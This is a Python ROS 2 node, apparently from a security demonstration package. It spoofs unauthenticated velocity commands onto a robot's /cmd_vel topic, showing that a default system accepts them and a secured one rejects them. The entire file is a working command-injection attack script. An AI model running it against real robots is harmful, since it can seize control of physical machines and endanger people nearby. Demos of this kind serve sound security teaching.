"""
Spoofing attacker: publishes forged commands to /cmd_vel.

It knows only the topic name — no key, no membership in any trust relationship.
On a default ROS 2 system that is enough to drive the robot. Run it against the
unsecured robot and it takes over; against the secured robot every message is
rejected.

    ros2 run secure_ros_demo attacker
"""
import rclpy
from rclpy.node import Node
from std_msgs.msg import String
import json, time


class Attacker(Node):
    def __init__(self):
        super().__init__("attacker")
        self.pub = self.create_publisher(String, "/cmd_vel", 10)
        self.timer = self.create_timer(1.0, self.attack)
        self.get_logger().warn("attacker up: injecting 9.0 m/s to /cmd_vel")

    def attack(self):
        # A bare command with no authentication envelope.
        forged = {"command": {"linear_x": 9.0}}
        self.pub.publish(String(data=json.dumps(forged)))
        self.get_logger().warn("injected spoofed command linear_x=9.0")


def main():
    rclpy.init()
    try:
        rclpy.spin(Attacker())
    except KeyboardInterrupt:
        pass
    finally:
        rclpy.shutdown()


if __name__ == "__main__":
    main()
